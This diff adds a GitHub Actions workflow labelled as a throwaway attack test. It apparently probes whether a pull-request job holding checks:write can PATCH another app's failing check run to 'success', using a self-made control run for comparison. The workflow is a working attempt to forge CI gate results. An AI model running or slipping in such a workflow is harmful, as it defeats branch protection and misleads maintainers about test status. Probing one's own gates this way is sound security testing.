@@ -1,0 +1,23 @@
+# Throwaway P4g attack (chrislongnguyen/dotfiles#3383): a PR-head job holding checks: write as app 15368 tries to
+# turn the gate App's failing check run green. The control PATCHes a run this job made itself.
+name: p4g-attack
+on: [push, pull_request]
+permissions: {}
+jobs:
+  patch:
+    runs-on: ubuntu-24.04
+    permissions:
+      checks: write
+    steps:
+      - env:
+          GH_TOKEN: ${{ github.token }}
+          TARGET: "135389579211"
+          EV: ${{ github.event_name }}
+        run: |
+          R=$GITHUB_REPOSITORY
+          control=$(gh api "repos/$R/check-runs" -f name=p4g-control -f head_sha="$GITHUB_SHA" -f status=completed -f conclusion=failure --jq .id)
+          code=$(gh api -X PATCH "repos/$R/check-runs/$control" -f conclusion=success -i 2>&1 | head -1)
+          echo "event=$EV control id=$control PATCH -> $code; now $(gh api repos/$R/check-runs/$control --jq '.conclusion + " app=" + (.app.id|tostring)')"
+          code=$(gh api -X PATCH "repos/$R/check-runs/$TARGET" -f status=completed -f conclusion=success -i 2>&1 | head -3 | tr '\n' ' ')
+          echo "event=$EV target PATCH -> $code"
+          echo "event=$EV target now $(gh api repos/$R/check-runs/$TARGET --jq '.conclusion + " app=" + .app.slug')"
